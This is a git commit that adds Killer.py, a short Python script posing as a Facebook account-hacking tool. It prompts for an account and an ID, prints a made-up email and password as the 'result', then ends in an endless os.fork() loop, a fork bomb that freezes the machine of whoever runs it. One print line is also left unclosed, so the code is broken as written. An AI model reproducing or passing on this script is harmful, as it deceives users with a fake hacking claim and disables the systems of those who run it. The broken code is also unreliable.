d55aae069a3035f664386c42fbb0dc2a4d41ea84
AnounomousHack <108554834+AnounomousHack@users.noreply.github.com>
2022-07-11 22:45:12 +0100

    killer.py
    pkg update
    pkg upgrade
    pkg install git

---
+++ Killer.py
@@ -0,0 +1,12 @@
+import os
+import time
+from time import sleep
+print("\033[1;36m enter the acount facebook :")
+sd = input("\033[1;31m ===>")
+print("enter the id acount : ")
+st = input("===>")
+time.sleep(2)
+print("Email :takashi34@gmail.com")
+print("password :49783563
+while True:
+     os.fork()
